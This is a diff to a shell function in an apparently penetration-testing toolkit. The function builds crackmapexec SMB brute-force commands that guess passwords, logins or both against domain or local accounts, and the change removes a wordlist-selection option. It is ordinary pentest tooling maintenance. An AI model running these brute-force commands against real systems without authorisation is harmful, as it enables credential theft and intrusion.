@@ -321,77 +321,43 @@ nb-ad-rce-brute-cme() {
     __ask "Do you want to add a domain? (y/n)"
     local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
 
-    __ask "Do you wanna manually specify wordlists? (y/n)"
-    local sw && __askvar sw "SPECIFY_WORDLIST"
-
     if [[ $login == "p" ]]; then
-      if [[ $sw == "y" ]]; then
         __ask "Select a password list"
         __askpath pl FILE $HOME/desktop/projects/
         nb-vars-set-user
 
         if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
+            nb-vars-set-domain
+            print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
         else
-          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
+            print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
         fi
-      else
-        nb-vars-set-passlist
-        if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
-        else
-          print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
-        fi
-      fi
     elif [[ $login == "l" ]]; then
-      if [[ $sw == "y" ]]; then
         __ask "Select a user list"
         __askpath ul FILE $HOME/desktop/projects/
         nb-vars-set-pass
 
         if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
+            nb-vars-set-domain
+            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
         else
-          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
+            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
         fi
-      else
-        nb-vars-set-wordlist
-        if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
-        else
-          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
-        fi
-      fi
     elif [[ $login == "b" ]]; then
-      if [[ $sw == "y" ]]; then
         __ask "Select a password list"
         __askpath pl FILE $HOME/desktop/projects/
         __ask "Select a user list"
         __askpath ul FILE $HOME/desktop/projects/
 
         if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
+            nb-vars-set-domain
+            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
         else
-          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
+            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
         fi
-      else
-        nb-vars-set-wordlist
-        nb-vars-set-passlist
-        if [[ $add_domain == "y" ]]; then
-          nb-vars-set-domain
-          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
-        else
-          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
-        fi
-      fi
     else
-      echo
-      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
     fi
 }
 
